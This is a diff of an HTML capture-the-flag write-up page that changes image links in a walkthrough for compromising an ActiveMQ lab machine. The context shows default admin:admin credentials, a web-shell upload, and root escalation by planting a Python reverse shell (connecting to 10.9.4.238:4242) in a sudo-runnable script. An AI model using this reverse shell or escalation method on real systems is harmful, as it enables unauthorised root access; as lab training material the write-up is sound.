@@ -161,7 +161,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <li>admin:admin works :)</li>
 </ul>
 <p>Installed mqtt.fx to be able to talk to port <strong>1883</strong> (mqtt) and eavesdrop the conversation between Paul and Max</p>
-<p><img src="https://monoloc0.github.io/images/dd92d75d7105467983b4267e1e8e45ae.png" alt="78654dfc4b5aff5536cdba21f74c1f2b.png"></p>
+<p><img src="https://monoloc0.github.io/images/dd92d75d7105467983b4267e1e8e45ae.png" alt="dd92d75d7105467983b4267e1e8e45ae.png"></p>
 <h1 id="uploading-shell">
   Uploading Shell
   <a class="heading-link" href="#uploading-shell">
@@ -172,7 +172,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <ul>
 <li>
 <p>Get File Path
-<img src="../../_resources/56d321d0e9d04d3090f03241b9eda70e.png" alt="0e45879c4f1922b5a12d976bf86015f6.png"></p>
+<img src="https://monoloc0.github.io/images/56d321d0e9d04d3090f03241b9eda70e.png" alt="56d321d0e9d04d3090f03241b9eda70e.png"></p>
 </li>
 <li>
 <p>Create Shell</p>
@@ -183,18 +183,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Upload Shell</p>
 </li>
 </ul>
-<p><img src="../../_resources/4b16ed30ad9a4ec69941e37fec3e067f.png" alt="3b4d51e1e86736f0313771d4af6783ee.png"></p>
+<p><img src="https://monoloc0.github.io/images/4b16ed30ad9a4ec69941e37fec3e067f.png" alt="4b16ed30ad9a4ec69941e37fec3e067f.png"></p>
 <ul>
 <li>Move Shell to directory where it can be executed</li>
 </ul>
-<p><img src="../../_resources/96a5b67af8f544e5a3a3dfdb8ba2a2d2.png" alt="6f9b09950c08f1e816b6e18eb3e53bce.png"></p>
+<p><img src="https://monoloc0.github.io/images/96a5b67af8f544e5a3a3dfdb8ba2a2d2.png" alt="96a5b67af8f544e5a3a3dfdb8ba2a2d2.png"></p>
 <ul>
 <li>Catch Reverse Shell</li>
 </ul>
-<p><img src="../../_resources/d2b195d99bf943c0a866b1aad992cc8a.png" alt="ba17b29798aef265feed9c575a7f20d7.png"></p>
+<p><img src="https://monoloc0.github.io/images/d2b195d99bf943c0a866b1aad992cc8a.png" alt="d2b195d99bf943c0a866b1aad992cc8a.png"></p>
 <ul>
 <li>Get 1st Flag
-<img src="../../_resources/ae4123d257694919974ef38a141b3542.png" alt="a4253088b7cf06b8f699241e2a62aedc.png"></li>
+<img src="https://monoloc0.github.io/images/ae4123d257694919974ef38a141b3542.png" alt="ae4123d257694919974ef38a141b3542.png"></li>
 </ul>
 <h1 id="privilege-escalation">
   Privilege Escalation
@@ -219,14 +219,14 @@ User activemq may run the following commands on activemq:
 
 </code></pre><p>It seems like we can execute subscribe.py <strong>as root.</strong> Nice.</p>
 <p>And we even have <strong>write access</strong> on subscribe.py</p>
-<p><img src="../../_resources/b4a3d14b96f640cb91e7f138fe57fd22.png" alt="06d8c4d2b450b2d9a8b9bb62ec599d57.png"></p>
+<p><img src="https://monoloc0.github.io/images/b4a3d14b96f640cb91e7f138fe57fd22.png" alt="b4a3d14b96f640cb91e7f138fe57fd22.png"></p>
 <p>So,we just put a python reverse shell in there:</p>
 <pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.4.238&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
 </code></pre><p>run the python script with <strong>sudo</strong></p>
 <pre tabindex="0"><code>activemq@activemq:/opt/apache-activemq-5.9.0$ sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
 
 </code></pre><p>and catch a shell ;)</p>
-<p><img src="../../_resources/ffa1f57f2885494e9a2661ed21563676.png" alt="ba42c7e304efeb5089d7f625f0e9b40b.png"></p>
+<p><img src="https://monoloc0.github.io/images/ffa1f57f2885494e9a2661ed21563676.png" alt="ffa1f57f2885494e9a2661ed21563676.png"></p>
 
   </article>
 </section>
